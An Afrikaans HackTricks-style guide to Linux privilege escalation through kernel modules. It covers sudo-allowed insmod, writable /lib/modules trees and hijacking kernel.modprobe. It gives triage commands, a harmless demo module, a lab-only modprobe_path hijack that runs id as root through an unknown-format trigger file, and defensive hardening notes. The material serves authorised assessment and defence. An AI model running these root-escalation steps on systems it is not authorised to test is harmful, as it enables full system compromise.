# Misbruik van Kernel Modules en modprobe

{{#include ../../banners/hacktricks-training.md}}

## Wankonfigurasies van kernel modules en module-laaiing

Kernel module-ondersteuning is ’n hoë-impak-area tydens ’n Linux privilege escalation-oorsig. Moenie elke unsigned-module-boodskap op sigself as exploitable beskou nie, maar gebruik dit om praktiese vrae te beantwoord:

- Kan die huidige gebruiker modules laai deur `sudo`, capabilities of ’n writable helper path?
- Is module-laaiing steeds enabled?
- Is module signature enforcement disabled?
- Is module directories of module files writable?
- Kan kernel logs gelees word om te bevestig wat gebeur het?

Vinnige triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretasie:

- `modules_disabled=1` beteken dat nuwe modules nie gelaai kan word totdat die stelsel herlaai word nie.
- `module_sig_enforce=1` blokkeer gewoonlik ongetekende modules.
- `dmesg_restrict=0` laat onbevoorregte gebruikers toe om kernellogboeke op baie stelsels te lees.
- Skryfbare paaie onder `/lib/modules/$(uname -r)/` is gevaarlik omdat module-ontdekking en outomatiese laai daardie boomstruktuur kan vertrou.

### Laai van ’n module en lees van kernuitset

As jy wettige toestemming het om ’n plaaslike module te laai, plaas `insmod` die presiese `.ko`-lêer wat jy verskaf. Die module se init-funksie loop onmiddellik, en boodskappe wat met `printk()` geskryf word, verskyn in kernellogboeke.

Minimale werkvloei vir hersienings- of laboratoriumomgewings:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
As `sudo -l` `insmod`, `modprobe` of ’n wrapper rondom hulle toelaat, beskou dit as kritiek:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-toegelate `insmod`

'n Sudo-reël wat 'n gebruiker toelaat om `insmod` uit te voer, is nie vergelykbaar met die toelating van 'n normale administratiewe helper nie. Die module se initialiseringskode loop in kernel-konteks sodra die `.ko` ingevoeg word, dus is die praktiese hersieningsvraag: "kan hierdie gebruiker die module wat gelaai word, kies of wysig?"

Generiese hersieningsvloei:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Indien die gebruiker ’n arbitrêre `.ko` kan verskaf, moet die reël as ’n volledige kompromittering van die stelsel in ’n gemagtigde assessment beskou word. ’n Veiliger operasionele patroon is om te vermy dat modulelaai deur sudo gedelegeer word; indien dit onvermydelik is, beperk die presiese pad, eienaarskap, permissions, signing policy en verwyderingswerkvloei.

Vir ’n onskadelike modulebou-patroon in ’n beheerde lab lyk ’n minimale bron en Makefile soos volg:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Bou en laai slegs in 'n gemagtigde laboratorium:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Kontroles vir misbruik van `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` beheer die userspace-helper wat die kernel aanroep wanneer dit hulp met die laai van modules benodig. As ’n aanvaller dit na ’n skryfbare uitvoerbare pad kan verander en ’n onbekende binêre formaat of ’n ander moduleversoekpad kan aktiveer, kan dit tot root code execution lei.

Kontroleer die huidige helper:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Kyk of jy dit kan beïnvloed:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Generiese patroon slegs vir laboratoriumgebruik:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Op geharde stelsels behoort dit te misluk omdat onbevoorregte gebruikers nie na `kernel.modprobe` kan skryf nie, die helper-pad nie skryfbaar is nie, of module-laaipaaie geblokkeer word.

### Hersiening van skryfbare `/lib/modules`

Skryfbare module-gidse kan modulevervanging, die plant van kwaadwillige modules of misbruik van outomatiese laai moontlik maak, afhangend van hoe `modprobe` later aangeroep word.

Hersien skryfbare liggings:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Indien jy skryfbare module-inhoud vind, kontroleer hoe modules ontdek word:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensiewe notas:

- Hou `/lib/modules` in die besit van `root:root` en maak dit nie-skryfbaar vir gebruikers nie.
- Stel `kernel.modules_disabled=1` ná selflaai waar dit operasioneel moontlik is.
- Dwing module-ondertekening af op stelsels wat laaibare modules vereis.
- Monitor skrywings na `/proc/sys/kernel/modprobe`, `/lib/modules`, en onverwagte uitvoering van `insmod`/`modprobe`.
